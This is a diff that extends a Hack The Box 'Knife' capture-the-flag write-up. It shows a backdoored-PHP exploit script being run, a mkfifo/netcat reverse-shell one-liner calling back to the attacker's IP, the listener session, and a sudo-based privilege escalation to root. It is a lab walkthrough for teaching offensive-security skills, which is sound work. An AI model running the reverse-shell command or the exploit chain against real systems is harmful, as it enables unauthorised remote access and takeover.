@@ -73,6 +73,7 @@ Doing some research we know that this PHP version was released with a backdoor. 
 Using the script i´ve found in exploitdb i´ve got an non stable shell in the server. 
 
 ```
+bash
 Enter the full host url:
 http://10.10.10.242/
 
@@ -103,7 +104,64 @@ sys
 tmp
 usr
 var
-
 ```
 
+To get an interactive shell i set up a listener in my machine running on port 4444 and used a reverse shell comand in the server. 
 
+#### Remote shell execution 
+```
+bash
+└─$ python 49933.py
+Enter the full host url:
+http://10.10.10.242/
+
+Interactive shell is opened on http://10.10.10.242/ 
+Can't acces tty; job crontol turned off.
+$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.71 4443 >/tmp/f
+
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>504 Gateway Timeout</title>
+</head><body>
+<h1>Gateway Timeout</h1>
+<p>The gateway did not receive a timely response
+from the upstream server or application.</p>
+<hr>
+<address>Apache/2.4.41 (Ubuntu) Server at 10.10.10.242 Port 80</address>
+</body></html>
+``
+
+#### Listener and user flag
+```
+└─$ nc -lnvp 4443
+listening on [any] 4443 ...
+connect to [10.10.14.71] from (UNKNOWN) [10.10.10.242] 38728
+bash: cannot set terminal process group (1018): Inappropriate ioctl for device
+bash: no job control in this shell
+james@knife:/$ cd /home/james
+```
+![](../assets/images/htb-writeup-knife/web-user-txt.png)
+
+
+## Privilege Escalation
+
+A common way to get privileges in a machine is by searching SUID binaries, which can be executed with the privileges of an owner or group, this can help us to get a privileged shell. 
+```
+bash
+james@knife:/$ sudo -l     
+sudo -l
+Matching Defaults entries for james on knife:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on knife:
+    (root) NOPASSWD: /usr/bin/knife
+```
+
+Ive look for the knife binary that we can run it as root and found that can help us to get the root shell.
+
+![](../assets/images/htb-writeup-knife/web-gtfobins.png)
+
+And we have the root flag 
+
+![](../assets/images/htb-writeup-knife/web-root-txt.png)
